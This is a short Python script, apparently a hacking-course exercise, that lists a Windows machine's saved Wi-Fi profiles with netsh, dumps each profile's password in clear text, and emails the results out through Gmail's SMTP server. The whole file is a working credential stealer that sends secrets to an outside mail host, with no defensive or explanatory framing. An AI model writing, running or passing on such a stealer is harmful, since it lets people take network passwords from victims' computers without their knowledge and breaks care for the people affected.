#! /usr/bin/env python

import subprocess,smtplib,re

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587) #create a smtp sevrer
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)#from ,to, message
    server.quit()
    
command="netsh wlan show profile"
networks= subprocess.check_output(command, shell=True)
network_names_list=re.findall("(?:Profile\s*:\s)(.*)",networks)

results=""

for network_name in network_names_list:
    command= "netsh wlan show profile "+network_name+" key=clear"
    current_result=subprocess.check_output(command,shell=True)
    results+=current_result

send_mail("email@gmail.com","password",results)


#spacing in SSID name wasnt resolved until this point
